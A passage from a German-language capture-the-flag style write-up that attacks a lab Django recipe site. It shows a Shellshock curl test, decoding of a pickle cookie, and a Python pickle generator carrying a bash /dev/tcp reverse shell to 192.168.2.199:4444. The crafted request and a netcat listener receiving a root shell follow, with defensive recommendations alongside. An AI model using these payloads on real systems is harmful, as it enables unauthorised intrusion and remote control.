                <strong>Empfehlung (Pentester):</strong> Fügen Sie die identifizierten Namen (<span class="command">ramsey</span>, <span class="command">wan</span>, <span class="command">oliver</span>) Ihrer Liste potenzieller Benutzernamen hinzu. Versuchen Sie, diese Namen gegen Login-Seiten (Web-Login, SSH) zu testen, möglicherweise in Kombination mit gängigen oder geleakten Passwörtern.
                <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie die Offenlegung von gültigen Benutzernamen über öffentliche Schnittstellen. Wenn Benutzernamen angezeigt werden müssen (z.B. bei Blog-Posts), verwenden Sie Aliase oder stellen Sie sicher, dass die Offenlegung kein Risiko darstellt (z.B. durch sichere Anmeldeverfahren, die Brute-Force-Angriffe erschweren).
            </p>
            <div class="code-block">
                 <div class="terminal">
                    <pre>
http://192.168.2.48:5003/
<span class="command">[Un]baked</span>

    Home
    About

<span class="command">[Un]baked:/</span>
Share your recipes because why not?
Homemade Pickle

Homemade Pickle Ingredients Here’s what you’re ...

Posted by <span class="command">ramsey</span> on Oct. 3, 2020, 10:46 a.m.
Pickle Pie

How to Make It Step 1 Preheat oven to 350°F. F...

Posted by <span class="command">ramsey</span> on Oct. 3, 2020, 10:45 a.m.
Blueberry Pie

Blueberry Pie is marvelous, especially when made h...

Posted by <span class="command">wan</span> on Oct. 2, 2020, 2:47 p.m.
Apple Pie

Crust 1 box Pillsbury™ refrigerated pie crusts, s...

Posted by <span class="command">ramsey</span> on Oct. 2, 2020, 2:45 p.m.
German Chocolate Pie

Ingredients Pastry for single-crust pie (9 ...

Posted by <span class="command">oliver</span> on Oct. 2, 2020, 2:38 p.m.

Copyright © Your Website 2020
</pre>
                 </div>
            </div>

             <p class="analysis">
                <strong>Analyse:</strong> Ich rufe eine Fehlerseite auf der Webanwendung auf oder versuche, eine Aktion durchzuführen, die einen CSRF-Fehler auslöst. Die Ausgabe zeigt die Standard-Fehlerseite von Django, die bei einem CSRF-Fehler angezeigt wird.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Diese Fehlerseite ist extrem aufschlussreich. Sie bestätigt nicht nur, dass die Anwendung das Django-Framework verwendet, sondern die zusätzliche Hilfe-Sektion, die hier angezeigt wird ("You're seeing the help section of this page because you have <span class="command">DEBUG = True</span> in your Django settings file."), beweist, dass der Debug-Modus (`DEBUG = True`) auf diesem Produktionssystem aktiviert ist. Das ist eine kritische Fehlkonfiguration, die in Produktionsumgebungen niemals aktiv sein sollte. Im Debug-Modus leakt Django detaillierte Fehlerinformationen, einschließlich Stack Traces, Konfigurationseinstellungen und sogar den Inhalt von Variablen und Datenbankabfragen, wenn Fehler auftreten. Dies kann einem Angreifer immense Einblicke in die interne Funktionsweise der Anwendung und des Systems geben.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Notieren Sie sich, dass <span class="command">DEBUG = True</span> aktiv ist. Versuchen Sie, weitere Fehler zu provozieren (z.B. durch Eingabe ungültiger Daten, Zugriff auf nicht-existente URLs), um zu sehen, welche Art von Informationen geleakt werden. Achten Sie besonders auf Stack Traces, die Dateipfade oder Code-Snippets enthalten könnten.
                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie dringend den Django-Debug-Modus (<span class="command">DEBUG = False</span>) in der Produktionsumgebung. Konfigurieren Sie stattdessen ein robustes Logging, um Fehler intern zu verfolgen, ohne sensible Details nach außen zu geben. Passen Sie die <span class="command">CSRF_FAILURE_VIEW</span> an, um eine generische Fehlerseite anzuzeigen, die keine internen Details preisgibt.
            </p>
            <div class="code-block">
                 <div class="terminal">
                    <pre>
 <h1>Forbidden <span class="command"><span>(403)</span></span></h1>
 <p>CSRF verification failed. Request aborted.</p>

 <p>You are seeing this message because this site requires a CSRF cookie when submitting forms. This cookie is required for security reasons, to ensure that your browser is not being hijacked by third parties.</p>
 <p>If you have configured your browser to disable cookies, please re-enable them, at least for this site, or for “same-origin” requests.</p>

 <h2>Help</h2>
   
 <p>Reason given for failure:</p>
 <pre>
 <span class="command">CSRF cookie not set.</span>
 </pre>
   

 <p>In general, this can occur when there is a genuine Cross Site Request Forgery, or when
 <span class="command">[Link: Django's CSRF mechanism | Ziel: https://docs.djangoproject.com/en/3.1/ref/csrf/]</span> has not been used correctly. For PST forms, you need to
 ensure:</p>

 <ul>
   <li>Your browser is accepting cookies.</li>

   <li>The view function passes a <code>request</code> to the template's <span class="command">[Link: <code>render</code> | Ziel: https://docs.djangoproject.com/en/dev/topics/templates/#django.template.backends.base.Template.render]</span> method.</li>

   <li>In the template, there is a <code>{% csrf_token
 <scrpt > %}</code> template tag inside each PST form that
 targets an internal URL.</li>

   <li>If you are not using <code>CsrfViewMiddleware</code>, then you must use
 <code>csrf_protect</code> on any views that use the <code>csrf_token</code>
 template tag, as well as those that accept the PST data.</li>

   <li>The form has a valid CSRF token. After logging in in another browser
 tab or hitting the back button after a login, you may need to reload the
 page with the form, because the token is rotated after a login.</li>
 </ul>

 <p>You're seeing the help section of this page because you have <code><span class="password">DEBUG =
 True</span></code> in your Django settings file. Change that to <code>False</code>,
 and only the initial error message will be displayed.  </p>

 <p>You can customize this page using the CSRF_FAILURE_VIEW setting.</p>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ich habe das vom Nikto-Scan gemeldete Potenzial für die Shellshock-Schwachstelle auf dem Pfad <span class="command">/cgi_wrapper</span> untersucht. Ich versuche, den Shellshock-Exploit über den <span class="command">User-Agent</span> Header zu injizieren, der in CGI-Umgebungen oft als Umgebungsvariable übergeben wird. Der Payload <span class="command">() { :; }; /bin/ping -c 3 192.168.2.199</span> ist ein klassischer Shellshock-Test, der bei erfolgreicher Ausführung drei ICMP-Pakete an meine Kali-IP (192.168.2.199) senden sollte. Ich sende die Anfrage mit <span class="command">curl -H "User-Agent: ..." http://192.168.2.48:5003/cgi_wrapper</span> und leite die Ausgabe an <span class="command">grep "code"</span>, um interessante Zeilen im erwarteten Fehler-Output zu filtern.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Ausgabe zeigt, dass die Shellshock-Nutzlast zwar im <span class="command">User-Agent</span> gesendet wurde und die Anfrage den <span class="command">/cgi_wrapper</span>-Pfad erreicht hat, aber der Payload selbst wurde nicht ausgeführt. Stattdessen erhalte ich eine detaillierte Django-Fehlermeldung (dank <span class="command">DEBUG = True</span>), die zeigt, dass Django versucht hat, den Pfad zu verarbeiten, und dabei gescheitert ist. Die Ausgabe enthält Code-Snippets aus Django-Interna und meine eingefügte Payload ist in den Stack Trace eingebettet, was zeigt, dass sie als *Daten*, nicht als *Code* interpretiert wurde. Dies deutet darauf hin, dass entweder die Bash-Version nicht verwundbar ist, oder die Ausführungsumgebung des CGI-Skripts die Nutzlast nicht in einer anfälligen Weise verarbeitet. Die direkte Ausnutzung von Shellshock auf diesem Pfad scheint nicht erfolgreich zu sein, aber die Tatsache, dass der Pfad existiert und Django darauf reagiert, ist notiert.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Obwohl der direkte Shellshock-Test fehlschlug, gibt die detaillierte Django-Fehlermeldung Hinweise. Analysieren Sie die Fehlermeldung auf weitere geleakte Informationen (Dateipfade, Konfigurationen). Das Scheitern des Shellshock-Tests bedeutet, dass ein anderer Weg zum initialen Zugriff gesucht werden muss. Konzentrieren Sie sich weiter auf die Webanwendung selbst und die anderen gefundenen Pfade.
                <br><strong>Empfehlung (Admin):</strong> Wie bereits erwähnt: Deaktivieren Sie <span class="command">DEBUG = True</span> in Produktionsumgebungen. Prüfen Sie, ob die gemeldeten CGI-Pfade (<span class="command">/cgi_wrapper</span> etc.) auf dem System existieren und ob sie tatsächlich Bash in einer verwundbaren Version nutzen. Wenn nicht benötigt, entfernen Sie diese Pfade. Wenn benötigt, stellen Sie sicher, dass die Bash-Shell aktuell ist oder dass Eingaben sorgfältig validiert und nicht direkt an die Shell übergeben werden.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -H "User-Agent: () { :; }; /bin/ping -c 3 192.168.2.199" http://192.168.2.48:5003/cgi_wrapper | grep "code"</span></div>
                </div>
                <div class="terminal">
                    <pre>
          <code class="fname">/usr/local/lib/python3.8/site-packages/django/core/handlers/exception.py</code>, line 47, in inner
                    ....
                    ...
                    <td class="code"><pre>&<span class="command">#x27;cgi_wrapper&</span>#x27;</pre></td>
          <code class="fname">/usr/local/lib/python3.8/site-packages/django/db/models/manager.py</code>, line 85, in manager_method
                    <td class="code"><pre>()</pre></td>
                    <td class="code"><pre>{
					        <p class="analysis">
            <strong>Analyse:</strong> Der <span class="command">search_cookie</span>-Wert <span class="command">"gASVCQAAAAAAAACMBXNzc3NzlC4="</span> aus der HTTP-Antwort sieht verdächtig BASE64-kodiert aus. Die Struktur <span class="command">"gASV"</span> am Anfang ist ein bekannter Marker für ein Python Pickle-serialisiertes Objekt im Binary-Protokoll. Um das zu bestätigen und zu verstehen, was im Cookie gespeichert ist, muss ich es dekodieren. Ich werde ein kleines Python-Skript verwenden, um den BASE64-String zu dekodieren.
        </p>
        <p class="evaluation">
            <strong>Bewertung:</strong> Das Erkennen der <span class="command">"gASV"</span> Signatur ist ein kritischer Schritt. Es deutet stark auf die Verwendung von Python Pickle hin, einem Serialisierungsformat, das bei der Deserialisierung (dem Zurückwandeln in ein Python-Objekt) Code ausführen kann, wenn die Daten von einer unvertrauenswürdigen Quelle stammen. Das Speichern von strukturierten Daten oder Objekten in Cookies ist an sich nicht unsicher, aber die Wahl des Serialisierungsformats ist hier entscheidend. Wenn es sich tatsächlich um Pickle handelt, haben wir einen sehr aussichtsreichen Vektor für Remote Code Execution gefunden.
        </p>
        <p class="recommendation">
            <strong>Empfehlung (Pentester):</strong> Dekodieren Sie den Cookie-Wert und versuchen Sie, das resultierende Objekt mit <span class="command">pickletools.dis</span> zu disassemblieren, um seine Struktur und seinen Inhalt zu verstehen. Bereiten Sie sich darauf vor, einen bösartigen Pickle-Payload zu erstellen, der einen Systembefehl ausführen kann.
            <br><strong>Empfehlung (Admin):</strong> **Dringend:** Überprüfen Sie, wie dieses <span class="command">search_cookie</span> erstellt und verarbeitet wird. Wenn Python Pickle für die Serialisierung von Daten verwendet wird, die aus Benutzereingaben (wie dem Suchbegriff) oder Cookies stammen, deaktivieren Sie dies sofort und stellen Sie auf ein sicheres Serialisierungsformat (z.B. JSON) um. Verwenden Sie niemals <span class="command">pickle.loads()</span> auf unvertrauenswürdigen Daten.
        </p>
        <div class="code-block">
            <div class="terminal">
                <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">vi dcookie.py</span></div>
            </div>
            <div class="terminal">
                <pre>
import base64

ecookie = "gASVCAAAAAAAAACMBG1pbHWULg=="
<span class="command">dcookie = base64.b64decode(ecookie) # Korrektur des Variablennamens im Skript</span>
print(dcookie)
</pre>
            </div>
        </div>

        <p class="analysis">
            <strong>Analyse:</strong> Ich habe ein kleines Python-Skript erstellt, um den BASE64-kodierten Cookie-Wert zu dekodieren. Das Skript importiert die <span class="command">base64</span>-Bibliothek, definiert den kodierten String und verwendet dann <span class="command">base64.b64decode()</span>, um die ursprünglichen Bytes zu erhalten. Beim Ausführen des Skripts (<span class="command">python3 dcookie.py</span>) wird die dekodierte Byte-Sequenz ausgegeben.
        </p>
        <p class="evaluation">
            <strong>Bewertung:</strong> Die Ausgabe <span class="command">b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04milu\x94.'</span> bestätigt, dass es sich um Binärdaten handelt, die mit dem Pickle-Protokoll beginnen (<span class="command">\x80\x04</span> deutet auf Protokoll 4 hin). Die Bytes enthalten den String <span class="command">"milu"</span>. Dies ist die Deserialisierung des Werts <span class="command">"sssss"</span>, der im ursprünglichen Cookie durch <span class="command">"gASVCQAAAAAAAACMBXNzc3NzlC4="</span> ersetzt wurde. Dieses Verhalten – dass der Suchterm in irgendeiner Form im Cookie landet und serialisiert wird – erhärtet den Verdacht, dass der Server dieses Cookie wieder deserialisiert.
        </p>
        <p class="recommendation">
            <strong>Empfehlung (Pentester):</strong> Das Dekodieren war erfolgreich. Der nächste Schritt ist die Disassemblierung des Pickle-Bytes, um die genaue Struktur des Objekts zu verstehen, das serialisiert wurde. Dies hilft dabei, einen schädlichen Payload zu konstruieren.
            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie dringend den Code, der das <span class="command">search_cookie</span> setzt und liest. Stellen Sie sicher, dass keine unsicheren Serialisierungsformate für benutzergenerierte oder vom Client stammende Daten verwendet werden.
        </p>
        <div class="code-block">
            <div class="terminal">
                <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">python3 dcookie.py</span></div>
            </div>
            <div class="terminal">
                <pre>
b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04milu\x94.'
</pre>
            </div>
        </div>

        <p class="analysis">
            <strong>Analyse:</strong> Um die Struktur des Pickle-Objekts im <span class="command">search_cookie</span> besser zu verstehen, verwende ich das eingebaute <span class="command">pickletools</span>-Modul in Python, speziell die <span class="command">dis()</span> Funktion, die Pickle-Bytecode disassembliert. Ich starte eine interaktive Python-Session (<span class="command">python3</span>), importiere die notwendigen Bibliotheken (<span class="command">base64</span>, <span class="command">pickletools</span>, <span class="command">io</span>), dekodiere den BASE64-String wieder und übergebe die resultierenden Bytes an <span class="command">pickletools.dis()</span>.
        </p>
        <p class="evaluation">
            <strong>Bewertung:</strong> Die Disassemblierung des Pickle-Objekts liefert die genauen Opcodes, die beim Deserialisieren ausgeführt werden. Die Ausgabe zeigt eine Sequenz von Opcodes, darunter <span class="command">PROTO 4</span> (Pickle-Protokoll Version 4), <span class="command">FRAME</span>, <span class="command">SHORT_BINUNICODE 'milu'</span> und <span class="command">STOP</span>. Der entscheidende Punkt ist die Anwesenheit des Strings <span class="command">'milu'</span> (vom Suchbegriff 'sssss') und die Tatsache, dass dies ein Pickle-Objekt ist. Pickle kann Opcodes enthalten, die Code-Ausführung erlauben, insbesondere durch die Serialisierung von Klassen mit einer <span class="command">__reduce__</span> Methode. Da das System scheinbar <span class="command">pickle.loads()</span> auf diesen Daten ausführt, kann ich einen bösartigen Payload erstellen, der die <span class="command">__reduce__</span> Methode nutzt, um einen Systembefehl auszuführen.
        </p>
        <p class="recommendation">
            <strong>Empfehlung (Pentester):</strong> Bestätigung der Pickle-Deserialisierung. Jetzt ist das Ziel, einen Python-Code zu schreiben, der ein Objekt serialisiert, dessen Deserialisierung einen Befehl auf dem Zielsystem ausführt. Dieser Pickle-Payload wird dann BASE64-kodiert und im <span class="command">search_cookie</span> an den Server gesendet.
            <br><strong>Empfehlung (Admin):</strong> **Sofortmaßnahme:** Deaktivieren Sie die Funktionalität, die dieses <span class="command">search_cookie</span> verwendet, oder ändern Sie das Serialisierungsformat auf etwas Sicheres wie JSON. Führen Sie einen Code-Audit durch, um alle Stellen zu identifizieren, an denen <span class="command">pickle.loads()</span> mit unsicheren Datenquellen verwendet wird.
        </p>
        <div class="code-block">
            <div class="terminal">
                <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">python3</span></div>
            </div>
            <div class="terminal">
                <pre>
Python 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
  
>>> import base64, pickletools, io
>>> cookie_value_b64 = "gASVCAAAAAAAAACMBG1pbHWULg=="
>>> pickled_bytes = base64.b64decode(cookie_value_b64)
>>> print(pickled_bytes)
b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04milu\x94.'
>>> disassembled_stream = io.BytesIO(pickled_bytes)
>>> pickletools.dis(disassembled_stream)
    <span class="command">0: \x80 PROTO      4</span>
    <span class="command">2: \x95 FRAME      8</span>
   <span class="command">11: \x8c SHORT_BINUNICODE 'milu'</span> <<<<----
   <span class="command">17: \x94 MEMOIZE    (as 0)</span>
   <span class="command">18: .    STOP</span>
highest protocol among opcodes = 4
</pre>
            </div>
        </div>

        <p class="analysis">
            <strong>Analyse:</strong> Basierend auf der Bestätigung der Pickle Deserialisierungs-Schwachstelle erstelle ich nun ein Python-Skript, um einen bösartigen Pickle-Payload zu generieren. Dieses Skript nutzt die Fähigkeit von Pickle, Klassen mit einer <span class="command">__reduce__</span> Methode zu serialisieren. Die <span class="command">__reduce__</span> Methode kann ein Tupel zurückgeben, das eine Funktion und ihre Argumente beschreibt, die während der Deserialisierung ausgeführt werden sollen.
            <br>Ich definiere eine Klasse namens <span class="command">RCE</span> mit der <span class="command">__reduce__</span> Methode. Diese Methode gibt ein Tupel zurück, das die Funktion <span class="command">os.system</span> und als Argument einen Bash-Befehl enthält. Der Befehl <span class="command">'bash -c "bash -i >& /dev/tcp/{KALI_IP}/{LISTEN_PORT} 0>&1"'</span> ist ein gängiger Bash Reverse Shell Payload. Er verbindet eine interaktive Bash-Shell über TCP mit meiner Angreifer-IP (<span class="command">KALI_IP</span>) und dem Listener-Port (<span class="command">LISTEN_PORT</span>), die im Skript definiert sind (192.168.2.199 auf Port 4444).
            <br>Das Skript erstellt eine Instanz der <span class="command">RCE</span>-Klasse, serialisiert sie mit <span class="command">pickle.dumps()</span> und kodiert das Ergebnis in BASE64 mit <span class="command">base64.b64encode()</span>. Das BASE64-Ergebnis wird ausgegeben.
        </p>
        <p class="evaluation">
            <strong>Bewertung:</strong> Dieses Skript implementiert die klassische Methode zur Ausnutzung von unsicherem Python Pickle Deserialization. Der generierte BASE64-String repräsentiert ein Python-Objekt, das, wenn es auf dem Zielsystem deserialisiert wird, den definierten Bash Reverse Shell-Befehl ausführt. Dies ist unser geplanter Weg zum initialen Systemzugriff.
        </p>
        <p class="recommendation">
            <strong>Empfehlung (Pentester):</strong> Führen Sie dieses Skript aus, um den schädlichen BASE64-Payload zu erhalten. Bereiten Sie einen Netcat-Listener auf Ihrem Angreifer-System auf dem definierten Port vor. Senden Sie dann diesen Payload im <span class="command">search_cookie</span> an den Webserver, um die Reverse Shell zu triggern.
            <br><strong>Empfehlung (Admin):</strong> Verstehen Sie, dass unsichere Deserialisierung eine der gefährlichsten Schwachstellen ist, die zu direkter Remote Code Execution führt. Der Einsatz von Pickle mit unvertrauenswürdigen Daten muss eingestellt werden.
        </p>
        <div class="code-block">
            <div class="terminal">
                <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">vi generat_rce.py</span></div>
            </div>
            <div class="terminal">
                <pre>
import pickle
import base64
import os

KALI_IP = "192.168.2.199"
LISTEN_PORT = 4444

class RCE:
    def __reduce__(self):
        cmd = f'bash -c "bash -i >& /dev/tcp/{KALI_IP}/{LISTEN_PORT} 0>&1"'
        return (os.system, (cmd,))

payload_object = RCE()
pickled_bytes = pickle.dumps(payload_object)
base64_payload = base64.b64encode(pickled_bytes)

print(base64_payload.decode())
</pre>
            </div>
        </div>

        <p class="analysis">
            <strong>Analyse:</strong> Ich führe das <span class="command">generat_rce.py</span> Skript aus, das ich gerade erstellt habe, um den BASE64-kodierten Python Pickle Payload zu erhalten. Der Befehl ist einfach <span class="command">python3 generat_rce.py</span>.
        </p>
        <p class="evaluation">
            <strong>Bewertung:</strong> Das Ergebnis ist der erwartete BASE64-String: <span class="password">gASVUAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDViYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMi4xOTkvNDQ0NCAwPiYxIpSFlFKULg==</span>. Dieser String enthält die serialisierte Form meiner <span class="command">RCE</span>-Klasse und des Bash Reverse Shell Befehls. Diesen String werde ich im <span class="command">search_cookie</span> des nächsten POST-Requests an <span class="command">/search</span> verwenden, um die Schwachstelle auszunutzen und die Reverse Shell zu initiieren.
        </p>
        <p class="recommendation">
            <strong>Empfehlung (Pentester):</strong> Kopieren Sie diesen generierten BASE64-String. Richten Sie nun einen Netcat-Listener auf Ihrem Angreifer-System ein. Ersetzen Sie im nächsten POST-Request an <span class="command">/search</span> den ursprünglichen <span class="command">search_cookie</span>-Wert durch diesen Payload und senden Sie den Request.
            <br><strong>Empfehlung (Admin):</strong> Achten Sie auf ungewöhnliche Cookie-Werte, insbesondere solche, die wie BASE64-kodierte Binärdaten aussehen und in Verbindung mit POST-Requests stehen. Implementieren Sie Intrusion Detection Systems (IDS) oder Web Application Firewalls (WAFs), die bekannte Muster von Serialisierungs-Exploits erkennen können.
        </p>
        <div class="code-block">
            <div class="terminal">
                <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">python3 generat_rce.py</span></div>
            </div>
            <div class="terminal">
                <pre>
<span class="password">gASVUAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDViYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMi4xOTkvNDQ0NCAwPiYxIpSFlFKULg==</span>
</pre>
            </div>
        </div>

        <p class="analysis">
            <strong>Analyse:</strong> Nun ist der Moment gekommen, die Pickle Deserialisierungs-Schwachstelle auszunutzen. Ich sende erneut einen HTTP POST-Request an den <span class="command">/search</span>-Pfad, genau wie bei der Analyse des Cookies zuvor. Der entscheidende Unterschied ist, dass ich den Wert des <span class="command">search_cookie</span> im <span class="command">Cookie</span>-Header durch den BASE64-kodierten, bösartigen Pickle-Payload ersetze, den ich im vorherigen Schritt generiert habe (<span class="password">gASVUAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDViYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMi4xOTkvNDQ0NCAwPiYxIpSFlFKULg==</span>). Der <span class="command">csrfmiddlewaretoken</span> wird ebenfalls mitgesendet, um CSRF-Prüfungen zu umgehen (obwohl es hier wahrscheinlich nicht relevant wäre, da der Angriff über das Cookie und nicht über das Formular erfolgt). Der <span class="command">query=sssss</span> Parameter wird beibehalten, obwohl sein Inhalt in diesem Fall irrelevant sein sollte, da der Payload im Cookie liegt. Ich sende diesen Request, während ein Netcat-Listener auf meinem Angreifer-System läuft.
        </p>
        <p class="evaluation">
            <strong>Bewertung:</strong> Dieser Request ist der Auslöser für die Remote Code Execution. Wenn der Server das modifizierte <span class="command">search_cookie</span> liest und dessen Inhalt deserialisiert, sollte der im Payload eingebettete Systembefehl (<span class="command">bash -c "bash -i >& /dev/tcp/192.168.2.199/4444 0>&1"</span>) ausgeführt werden. Das erwartete Ergebnis ist eine eingehende Verbindung von der Zielmaschine auf meinem Netcat-Listener, die mir eine interaktive Shell gibt.
        </p>
        <p class="recommendation">
            <strong>Empfehlung (Pentester):</strong> Überprüfen Sie sofort den Netcat-Listener. Bei Erfolg haben Sie initialen Zugriff auf das System. Dokumentieren Sie die erhaltene Shell und die Berechtigungen, mit denen Sie gestartet sind.
            <br><strong>Empfehlung (Admin):</strong> Dies demonstriert die direkte Ausnutzung einer schwerwiegenden Schwachstelle. Überwachen Sie Webserver-Logs und Netzwerkverkehr auf ungewöhnliche Anfragen, insbesondere solche mit manipulierten Cookies oder unerwartetem BASE64-Inhalt. Implementieren Sie strenge Input-Validierung und verwenden Sie sichere Programmierpraktiken, um Deserialisierungsangriffe zu verhindern.
        </p>
        <div class="code-block">
            <div class="terminal">
                <pre>
<span class="command">PST /search HTTP/1.1</span>
<span class="command">Host: 192.168.2.48:5003</span>
<span class="command">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
<span class="command">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="command">Accept-Language: de,en-US;q=0.7,en;q=0.3</span>
<span class="command">Accept-Encoding: gzip, deflate, br</span>
<span class="command">Referer: http://192.168.2.48:5003/</span>
<span class="command">Content-Type: application/x-www-form-urlencoded</span>
<span class="command">Content-Length: 96</span>
<span class="command">Origin: http://192.168.2.48:5003</span>
<span class="command">DNT: 1</span>
<span class="command">Connection: keep-alive</span>
<span class="command">Cookie: csrftoken=J167sPVx1AW33KOvUsajp8TnFZaWAHmc3MXApp3e5z9QuhRLZww7eDzpn0GiERaw; search_cookie="<span class="password">gASVUAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDViYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMi4xOTkvNDQ0NCAwPiYxIpSFlFKULg==</span>"</span>
<span class="command">Upgrade-Insecure-Requests: 1</span>
<span class="command">Sec-GPC: 1</span>
<span class="command">Priority: u=0, i</span>

<span class="command">csrfmiddlewaretoken=aqH27U6WwAnfzoreXF9ci1La9scPubV9ubyv4ueDAzA20Vuu2Jv07wrcRtIbylJt&query=sssss</span>
</pre>
            </div>
        </div>

        <p class="analysis">
            <strong>Analyse:</strong> Vor dem Senden des bösartigen POST-Requests habe ich, wie geplant, einen Netcat-Listener auf meinem Angreifer-System gestartet. Der Befehl <span class="command">nc -lvnp 4444</span> richtet einen Listener ein, der auf Port 4444 lauscht:
            <br>- <span class="command">-l</span>: Listen-Modus
            <br>- <span class="command">-v</span>: Verbose-Modus, zeigt Verbindungsinformationen
            <br>- <span class="command">-n</span>: Numerische Adressen, keine DNS-Auflösung
            <br>- <span class="command">-p 4444</span>: Gibt den Port an, auf dem gelauscht werden soll.
            <br>Nach dem Senden des POST-Requests an <span class="command">/search</span> auf der Ziel-VM zeigt die Ausgabe des Netcat-Listeners eine eingehende Verbindung von der IP-Adresse des Ziels (192.168.2.48) auf dem Port 32918. Dies bestätigt, dass der Pickle Payload erfolgreich ausgeführt wurde und die Reverse Shell initiiert hat. Die folgenden Zeilen <span class="command">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span> und <span class="command">bash: no job control in this shell</span> sind typische Meldungen für eine nicht vollständig interaktive Shell, die aber für die Ausführung von Befehlen ausreicht. Der <span class="command">id</span> Befehl wurde sofort ausgeführt, um die aktuellen Benutzerberechtigungen zu prüfen.
        </p>
        <p class="evaluation">
            <strong>Bewertung:</strong> Fantastisch! Der initiale Zugriff war erfolgreich, nun habe ich mein Ziel erreicht! Die eingehende Verbindung und die Ausgabe des <span class="command">id</span>-Befehls, der <span class="password">uid=0(root) gid=0(root) groups=0(root)</span> zeigt, bestätigen, dass die Reverse Shell mit Root-Berechtigungen ausgeführt wurde. Das ist ein kritischer Erfolg, der die Schwere der Pickle Deserialisierungs-Schwachstelle unterstreicht. Ich habe direkten Systemzugriff, wenn auch zunächst in einer eingeschränkten Shell. Die anschließenden <span class="command">ls</span>-Befehle zeigen die Dateistruktur im aktuellen Verzeichnis (<span class="command">/home</span>) und offenbaren Dateien wie <span class="command">requirements.sh</span>, <span class="command">run.sh</span> und das Verzeichnis <span class="command">site</span>.
        </p>
        <p class="recommendation">
            <strong>Empfehlung (Pentester):</strong> Sichern Sie die Shell, um sie stabiler zu machen und volle Terminalfunktionen zu erhalten (z.B. mit <span class="command">script /dev/null -c bash</span> oder Python PTY-Shell). Beginnen Sie sofort mit der System-Enumeration, um zu verstehen, auf welchem System Sie sich befinden (Host oder Container?), welche Tools verfügbar sind und welche Privilegien Sie tatsächlich haben, um das endgültige Root auf dem Host-System zu erlangen.
            <br><strong>Empfehlung (Admin):</strong> **Alarmstufe Rot:** Ein Angreifer hat Root-Zugriff über die Webanwendung erlangt. Die Schwachstelle muss sofort behoben werden (unsichere Deserialisierung). Isolieren Sie das kompromittierte System vom Netzwerk, um eine weitere Ausbreitung zu verhindern. Führen Sie eine umfassende Forensik durch, um das Ausmaß des Kompromittierung festzustellen. Überprüfen Sie alle Webanwendungen auf ähnliche unsichere Deserialisierungs- oder Remote Code Execution Schwachstellen.
        </p>
        <div class="code-block">
            <div class="terminal">
                <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvnp 4444</span></div>
            </div>
            <div class="terminal">
                <pre>
listening on [any] 4444 ...
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.48] 32918</span>
<span class="password">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span>
<span class="password">bash: no job control in this shell</span>
root@8b39a559b296:/home# <span class="command">id</span>
<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
root@8b39a559b296:/home# <span class="command">ls</span>
<span class="command">requirements.sh</span>
<span class="command">run.sh</span>
<span class="command">site</span>
root@8b39a559b296:/home# 
</pre>
            </div>
        </div>

        <section id="proof-of-concept">
             <h2>Proof of Concept: Remote Code Execution via Unsafe Pickle Deserialization</h2>
             <p>
                <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert, wie die identifizierte unsichere Deserialisierungs-Schwachstelle im <span class="command">search_cookie</span> der Webanwendung ausgenutzt werden kann, um beliebigen Code mit Root-Berechtigungen auf dem Zielsystem auszuführen. Dies führte zur Erlangung einer Reverse Shell und damit zum initialen Zugriff auf das System.
             </p>
             <p>
                <strong>Voraussetzungen:</strong>
                <ul>
                    <li>Zugriff auf das Netzwerk, in dem sich die Ziel-VM (192.168.2.48) befindet.</li>
                    <li>Ein Angreifer-System (z.B. Kali Linux) mit installierten Tools (<span class="command">python3</span>, <span class="command">base64</span>, <span class="command">pickletools</span>, <span class="command">os</span>, <span class="command">nc</span>, <span class="command">curl</span> oder Web-Proxy wie Burp Suite).</li>
                    <li>Kenntnisse über Python Pickle Deserialisierungsschwachstellen.</li>
                    <li>Die IP-Adresse des Angreifer-Systems (192.168.2.199) und ein offener Port für den Netcat-Listener (4444).</li>
                </ul>
             </p>
             <p>
                <strong>Schritt-für-Schritt-Anleitung:</strong>
                <ol>
